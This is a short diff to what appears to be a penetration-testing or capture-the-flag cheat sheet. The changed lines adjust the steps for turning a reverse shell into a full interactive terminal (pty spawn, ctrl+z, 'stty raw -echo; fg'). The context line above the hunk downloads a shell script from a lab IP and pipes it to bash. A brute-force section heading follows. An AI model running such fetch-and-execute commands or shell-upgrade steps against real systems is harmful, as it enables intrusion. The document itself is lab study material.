@@ -167,8 +167,9 @@ curl http://10.10.14.49:4444/shell.sh | bash
 run pseudo temrinal with /bin/bash instance, determine type of terminal in use and foreground last processes in running  
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo; fg
 export TERM=xterm
-stty raw -echo;
 ```
 #### 3.3 Password bruteforce  
 before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long  
